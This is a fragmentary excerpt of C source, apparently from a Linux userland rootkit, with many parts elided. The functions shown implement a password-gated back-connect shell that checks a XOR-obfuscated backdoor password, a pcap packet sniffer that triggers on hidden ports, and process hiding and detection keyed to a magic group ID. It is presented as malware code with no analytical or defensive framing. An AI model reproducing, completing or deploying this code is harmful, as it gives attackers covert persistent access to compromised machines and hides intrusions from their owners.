void backconnect(struct in_addr addr, u_short port){
    ...
    char *target = inet_ntoa(addr), tmp[128], *pw, *prepper;
    ...
    tmp[strlen(tmp)-1]='\0';
    pw = xordup(BACKDOOR_PASS);
    got_pw = !strcmp(crypt(tmp, pw), pw);
    clean(pw);
    memset(tmp, 0, sizeof(tmp));
    ...
    if(!bc) call(CCHDIR, "/dev/shm");
    else{
        call(CCHDIR, bc->homedir);
        bree(bc);
    }
...
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
    ...
    hidden = is_hidden_port(htons(tcp->th_sport), NULL);
    if(!hidden)
        return;
...
int pdoorup(void){
    ...
    while((dir = call(CREADDIR, dp)) != NULL && !status){
        ...
        if((long)call(C__XSTAT, _STAT_VER, procpath, &procstat) < 0)
            continue;
        procstat.st_gid == magicid ? status=1 : 0;
    }
...
void spawnpdoor(void){
    ...
    if((long)call(CSETGID, readid()-1) < 0)
        exit(0);
